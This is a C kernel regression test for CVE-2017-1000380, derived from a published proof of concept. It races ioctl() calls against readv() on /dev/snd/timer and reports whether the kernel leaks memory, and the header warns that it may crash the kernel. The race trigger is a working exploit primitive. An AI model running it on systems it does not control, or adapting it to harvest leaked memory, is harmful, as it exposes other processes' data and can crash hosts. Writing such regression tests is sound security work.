// SPDX-License-Identifier: GPL-2.0-or-later

/* Copyright (c) 2019 Michael Moese <mmoese@suse.com>
 * Regression test for CVE-2017-1000380 based on the original PoC exploit
 * by Alexander Potapenko <glider@google.com>
 *
 * Be careful! This test may crash your kernel!
 *
 * The test performs several ioctl() parallel with readv() on the same
 * file descriptor to /dev/snd/timer. A buggy kernel will leak memory
 * to the process, which may contain information from the kernel or
 * any other process on the system.
 *
 * The issue was fixed with
 *   http://git.kernel.org/linus/d11662f4f798b50d8c8743f433842c3e40fe3378
 *   http://git.kernel.org/linus/ba3021b2c79b2fa9114f92790a99deb27a65b728
 */

#include "config.h"
#include "tst_test.h"
#include "tst_fuzzy_sync.h"
#include "tst_safe_macros.h"
#include "tst_safe_pthread.h"

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sound/asound.h>

#define MAX_BUFSIZE 1024

static int snd_fd;
static struct tst_fzsync_pair fzsync_pair;

static void *ioctl_thread(void *unused)
{
	int tread_arg = 1;
	struct snd_timer_select ts;
	struct snd_timer_params tp;

	memset(&ts, 0, sizeof(ts));
	ts.id.dev_class = 1;

	memset(&tp, 0, sizeof(tp));
	tp.ticks = 1;
	tp.filter = 0xf;

	while (tst_fzsync_run_b(&fzsync_pair)) {
		tst_fzsync_start_race_b(&fzsync_pair);
		ioctl(snd_fd, SNDRV_TIMER_IOCTL_TREAD, &tread_arg);
		ioctl(snd_fd, SNDRV_TIMER_IOCTL_SELECT, &ts);
		ioctl(snd_fd, SNDRV_TIMER_IOCTL_PARAMS, &tp);
		ioctl(snd_fd, SNDRV_TIMER_IOCTL_START, 0);
		tst_fzsync_end_race_b(&fzsync_pair);
	}
	return unused;
}

static void setup(void)
{
	if(access("/dev/snd/timer", F_OK))
		tst_brk(TCONF, "The file '/dev/snd/timer' is not exist");

	tst_fzsync_pair_init(&fzsync_pair);
	snd_fd = SAFE_OPEN("/dev/snd/timer",
			O_RDONLY|O_CREAT|O_NOCTTY|O_SYNC|O_LARGEFILE, 0);
}

static void cleanup(void)
{
	if (snd_fd > 0)
		SAFE_CLOSE(snd_fd);
}

static void run(void)
{
	size_t len;
	int size;
	struct iovec iov;
	pthread_t th;
	char read_buf[MAX_BUFSIZE];
	int i, nz;
	pthread_attr_t thread_attr;

	pthread_attr_init(&thread_attr);
	pthread_attr_setdetachstate(&thread_attr, PTHREAD_CREATE_DETACHED);
	SAFE_PTHREAD_CREATE(&th, &thread_attr, ioctl_thread, NULL);

	iov.iov_base = read_buf;
	iov.iov_len = sizeof(read_buf) - 1;

	tst_fzsync_pair_reset(&fzsync_pair, NULL);
	while (tst_fzsync_run_a(&fzsync_pair)) {
		nz = 0;
		memset(read_buf, 0, sizeof(read_buf));

		tst_fzsync_start_race_a(&fzsync_pair);
		size = readv(snd_fd, &iov, 1);
		tst_fzsync_end_race_a(&fzsync_pair);

		/* check if it could be a valid ioctl result */
		if (size == 0)
			continue;

		/* check if the buffer is non-empty */
		for (i = 0; i < size; i++) {
			if (read_buf[i]) {
				nz = 1;
				break;
			}
		}
		if (!nz)
			continue;

		len = strlen(read_buf);
		/* the kernel's struct snd_timer_read is two unsigned integers*/
		if (len <= 2 * sizeof(unsigned int))
			continue;

		tst_res(TFAIL, "kernel seems vulnerable");
		return;
	}

	if (tst_taint_check() != 0)
		tst_res(TFAIL, "kernel seems vulnerable");
	else
		tst_res(TPASS, "kernel seems not vulnerable");
}

static struct tst_test test = {
	.test_all = run,
	.setup = setup,
	.cleanup = cleanup,
	.taint_check = TST_TAINT_W | TST_TAINT_D,
	.runtime = 150,
	.min_runtime = 2,
	.tags = (const struct tst_tag[]) {
		{"linux-git", "d11662f4f798"},
		{"linux-git", "ba3021b2c79b"},
		{"CVE", "2017-1000380"},
		{}
	}
};
